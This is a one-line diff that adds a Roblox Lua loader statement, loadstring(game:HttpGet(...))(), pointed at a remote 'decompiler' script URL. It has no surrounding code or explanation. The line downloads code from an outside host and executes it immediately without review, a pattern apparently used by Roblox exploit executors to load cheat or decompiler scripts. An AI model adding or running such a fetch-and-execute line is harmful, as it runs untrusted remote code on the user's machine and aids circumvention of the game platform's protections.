@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://lunaux-decompiler.dev/script"))()
